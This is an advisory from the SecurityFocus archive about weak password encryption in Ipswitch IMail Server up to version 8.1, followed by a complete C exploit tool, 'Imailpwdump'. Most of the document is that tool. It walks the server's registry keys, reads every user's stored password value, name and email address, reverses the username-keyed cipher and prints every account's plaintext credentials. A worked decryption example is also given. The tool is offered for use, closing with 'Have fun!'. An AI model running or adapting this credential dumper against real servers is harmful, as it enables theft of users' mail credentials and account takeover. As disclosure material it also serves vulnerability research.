source: http://www.securityfocus.com/bid/10956/info

Ipswitch IMail is reported to use a weak encryption algorithm when obfuscating saved passwords. A local attacker who has the ability to read the encrypted passwords may easily derive the plaintext password if the username that is associated with the password is known. 

A local attacker may exploit this weakness to disclose user credentials.

/*************************************************************************************************
*       IpSwitch IMail Server <= ver 8.1 User Password Decryption
*
*       by Adik < netmaniac[at]hotmail.KG >
*
*       IpSwitch IMail Server uses weak encryption algorithm to encrypt its user passwords. It uses
*       polyalphabetic Vegenere cipher to encrypt its user passwords. This encryption scheme is
*       relatively easy to break. In order to decrypt user password we need a key. IMail uses username
*       as a key to encrypt its user passwords. The server stores user passwords in the registry under the key
*       "HKEY_LOCAL_MACHINE\SOFTWARE\IpSwitch\IMail\Domains\<domainname>\Users\<username>\Password".
*       Before decrypting password convert all upper case characters in the username to lower case
*       characters. We use username as a key to decrypt our password.
*       In order to get our plain text password, we do as follows:
*       1) Subtract hex code of first password hash character by the hex code of first username character.
*          The resulting hex code will be our first decrypted password character.
*       2) Repeat above step for the rest of the chars.
*
*       Look below, everythin is dead simple ;)
*       eg:
*
*       USERNAME:               netmaniac
*       PASSWORDHASH:   D0CEE7D5CCD3D4C7D2E0CAEAD2D3
*       --------------------------------------------
*
*       D0 CE E7 D5 CC D3 D4 C7 D2 E0 CA EA D2 D3       <- password hash
* -     6E 65 74 6D 61 6E 69 61 63 6E 65 74 6D 61       <- hex codes of username
*       n  e  t  m  a  n  i  a  c  n  e  t  m  a        <- username is a key
*       -----------------------------------------
*       62 69 73 68 6B 65 6B 66 6F 72 65 76 65 72       <- hex codes of decrypted password
*       b  i  s  h  k  e  k  f  o  r  e  v  e  r        <- actual decrypted password
*
*
*       pwdhash_hex_code                username_hex_code               decrypted_password
*       ------------------------------------------------------------------
*                       D0                      -               6E (n)                  =       62 (b)
*                       CE                      -               65 (e)                  =       69 (i)
*                       E7                      -               74 (t)                  =       73 (s)
*                       D5                      -               6D (m)                  =       68 (h)
*                       CC                      -               61 (a)                  =       6B (k)
*                       D3                      -               6E (n)                  =       65 (e)
*                       D4                      -               69 (i)                  =       6B (k)
*                       C7                      -               61 (a)                  =       66 (f)
*                       D2                      -               63 (c)                  =       6F (o)
*                       E0                      -               6E (n)                  =       72 (r)
*                       CA                      -               65 (e)                  =       65 (e)
*                       EA                      -               74 (t)                  =       76 (v)
*                       D2                      -               6D (m)                  =       65 (e)
*                       D3                      -               61 (a)                  =       72 (r)
*       ------------------------------------------------------------------
*
*       I've included a lil proggie to dump all the usernames/passwords from local machine's registry.
*       Have fun!
*       //Send bug reports to netmaniac[at]hotmail.KG
*
*       Greets to: my man wintie from .au, Chintan Trivedi :), jin yean ;), Morphique
*
*       [16/August/2004] Bishkek
**************************************************************************************************/


//#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#define snprintf        _snprintf
#pragma comment(lib,"advapi32")
#define ALLOWED_USERNAME_CHARS  "A-Z,a-z,0-9,-,_,."
#define MAX_NUM 1024 //500
#define DOMAINZ "Software\\IpSwitch\\IMail\\Domains"
#define VER     "1.1"
#define MAXSIZE 100

int total_accs=0;
int total_domainz=0,total_domain_accs=0;
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void greetz()
{
        printf( "\n\t--= [ IpSwitch IMail Server User Password Decrypter ver %s] =--\n\n"
                        "\t\t (c) 2004 by Adik ( netmaniac [at] hotmail.KG )\n\n\n",VER);
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void usage()
{
        printf( "------------------------------------------------------------------------\n");
        printf( " Imailpwdump [-d] -- Dumps IMail Server user/pwds from local registry\n\n"
                        " Imailpwdump [username] [passwordhash] -- User/PwdHash to decrypt\n\n"
                        " eg: Imailpwdump netmaniac D0CEE7D5CCD3D4C7D2E0CAEAD2D3\n");
        printf( "------------------------------------------------------------------------\n");

}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void str2hex(char *hexstring, char *outbuff)
{
        unsigned long tmp=0;
        char tmpchr[5]="";
        memset(outbuff,0,strlen(outbuff));
        if(strlen(hexstring) % 2)
        {
                printf(" Incorrect password hash!\n");
                exit(1);
        }
        if(strlen(hexstring)>MAXSIZE)
        {
                printf(" Password hash is too long! \n");
                exit(1);
        }
        for(unsigned int i=0, c=0; i<strlen(hexstring); i+=2, c++)
        {
                memcpy(tmpchr,hexstring+i,2);
                tmp = strtoul(tmpchr,NULL,16);
                outbuff[c] = (char)tmp;
        }
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void str2smallcase(char *input)
{
        if(strlen(input)>MAXSIZE)
        {
                printf(" Username too long! \n");
                return;
        }
        for(unsigned int i=0;i<strlen(input);i++)
        {
                if(isalnum(input[i]) || input[i] == '-' || input[i]=='_' || input[i]=='.')
                        input[i] = tolower(input[i]);
                else
                {
                        printf(" Bad characters in username!\n Allowed characters: %s\n",ALLOWED_USERNAME_CHARS);
                        return;
                }
        }
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void populate(char *input,unsigned int size)
{
        char tmp[MAX_NUM]="";
        unsigned int strl = strlen(input);
        strcpy(tmp,input);
        //netmaniacnetmaniacnetman
        for(unsigned int i=strlen(input),c=0;i<size;i++,c++)
        {
                if(c==strl)
                        c=0;
                input[i] = tmp[c];
        }
        input[i]='\0';
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void imail_decrypt(char *username, char *pwdhash,char *outbuff)
{
        //adik 123456
        //adikbek 123
        if(strlen(pwdhash) <= strlen(username) )
        {
                memset(outbuff,0,sizeof(outbuff));
                for(unsigned int i=0;i<strlen(pwdhash);i++)
                        outbuff[i] = (pwdhash[i]&0xff) - (username[i]&0xff);
                outbuff[i]='\0';
        }
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void get_usr_pwds(char *subkey,char *usr)
{
        long res;
        HKEY hPwdKey;
        char username[MAXSIZE]="";
        char passwdhash[MAXSIZE*2]="", passwd[MAXSIZE]="",clearpasswd[MAXSIZE]="";
        char fullname[MAXSIZE]="";
        char email[MAXSIZE]="";
        DWORD lType;
        DWORD passwdhashsz=sizeof(passwdhash)-1,fullnamesz=MAXSIZE-1,emailsz=MAXSIZE-1;

                res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_ALL_ACCESS,&hPwdKey);
                if(res!=ERROR_SUCCESS)
                {
                        printf(" Error opening key %s! Error #:%d\n",subkey,res);
                        exit(1);
                        //return;
                }

                if(RegQueryValueEx(hPwdKey,"Password",0,&lType,(LPBYTE)passwdhash,&passwdhashsz)!= ERROR_SUCCESS)
                {
                        RegCloseKey(hPwdKey);
                        return;
                }
                if(RegQueryValueEx(hPwdKey,"FullName",0,&lType,(LPBYTE)fullname,&fullnamesz)!= ERROR_SUCCESS)
                {
                        RegCloseKey(hPwdKey);
                        return;
                }
                if(RegQueryValueEx(hPwdKey,"MailAddr",0,&lType,(LPBYTE)email,&emailsz)!=ERROR_SUCCESS)
                {
                        RegCloseKey(hPwdKey);
                        return;
                }


                str2smallcase(usr);
                strncpy(username,usr,sizeof(username)-1);
                str2hex(passwdhash,passwd);
                // adik 1234567
                // adik 12
                if(strlen(passwd)>strlen(username))
                        populate(username,strlen(passwd));
                imail_decrypt(username,passwd,clearpasswd);

                printf( "------------------------------------------------------------------------\n"
                                " FullName:\t %s\n"
                                " Email:\t\t %s\n"
                                " Username:\t %s\n"
                                " Password:\t %s\n",
                                fullname,email,usr,clearpasswd);
        total_accs++;
        RegCloseKey(hPwdKey);
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void dump_registry_pwds()
{
        HKEY hKey,hUserKey;
        DWORD domRes=0,usrRes=0, domlen=0,userlen=0,domIndex=0,userIndex=0;
        FILETIME ftime;
        char domain[150]="";
        char user[150]="";
        char tmpbuff[MAX_NUM]="";
        char usrtmpbuff[MAX_NUM]="";
        domRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,DOMAINZ,0,KEY_ALL_ACCESS,&hKey);
        if(domRes!=ERROR_SUCCESS)
        {
                printf(" Error opening key '%s'!\n IMail not installed?? Error #:%d\n",DOMAINZ,domRes);
                exit(1);
        }
        do
        {
                domlen=sizeof(domain)-1;
                domRes=RegEnumKeyEx(hKey,domIndex,domain,&domlen,NULL,NULL,NULL,&ftime);
                if(domRes!=ERROR_NO_MORE_ITEMS)
                {
                        printf("\n DOMAIN:\t [ %s ]\n",domain);
                        userIndex=0;
                        total_accs=0;
                        snprintf(tmpbuff,sizeof(tmpbuff)-1,"%s\\%s\\Users",DOMAINZ,domain);
                        usrRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmpbuff,0,KEY_ALL_ACCESS,&hUserKey);
                        if(usrRes==ERROR_SUCCESS)
                        {
                                //adik
                                do
                                {
                                        userlen=sizeof(user)-1;
                                        usrRes=RegEnumKeyEx(hUserKey,userIndex,user,&userlen,NULL,NULL,NULL,&ftime);
                                        if(usrRes!=ERROR_NO_MORE_ITEMS)
                                        {
                                                snprintf(usrtmpbuff,sizeof(usrtmpbuff)-1,"%s\\%s\\Users\\%s",DOMAINZ,domain,user);
                                                get_usr_pwds(usrtmpbuff,user);
                                        }
                                        userIndex++;
                                }
                                while(usrRes!=ERROR_NO_MORE_ITEMS);
                                RegCloseKey(hUserKey);
                                printf("\n\t Total:\t %d Accounts\n",total_accs);
                                total_domain_accs += total_accs;
                                total_domainz++;
                        }
                        domIndex++;
                }
        }
        while(domRes != ERROR_NO_MORE_ITEMS);
        RegCloseKey(hKey);
        //total_domains += dom
        printf("\n Total:\t %d Domains, %d Accounts\n",total_domainz,total_domain_accs);

}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void decrypt_usr_pass(char *usr,char *passwd)
{
        char username[MAX_NUM]="";
        char passwordhash[MAX_NUM]="";
        char outputbuff[250]="";

        str2smallcase(usr);
        strncpy(username,usr,sizeof(username)-1);
        str2hex(passwd,passwordhash);
        printf("------------------------------------------------------------------------\n");
        printf( " Username:\t\t %s\n"
                        " Passwordhash:\t\t %s\n",usr,passwd);
        if(strlen(passwordhash)>strlen(username))
                populate(username,strlen(passwordhash));

        imail_decrypt(username,passwordhash,outputbuff);
        printf(" Decrypted passwd:\t %s\n",outputbuff);
        printf("------------------------------------------------------------------------\n");
}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/
void main(int argc, char *argv[])
{
        greetz();

        if(argc ==2 && strncmp(argv[1],"-d",2)==0 )
        {
                //dump passwd from registry
                dump_registry_pwds();
        }
        else if(argc == 3 && strncmp(argv[1],"-d",2)!=0)
        {
                //decrypt username passwd
                decrypt_usr_pass(argv[1],argv[2]);
        }
        else
        {
                usage();
                return;
        }

        // ThE eNd

}
/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/

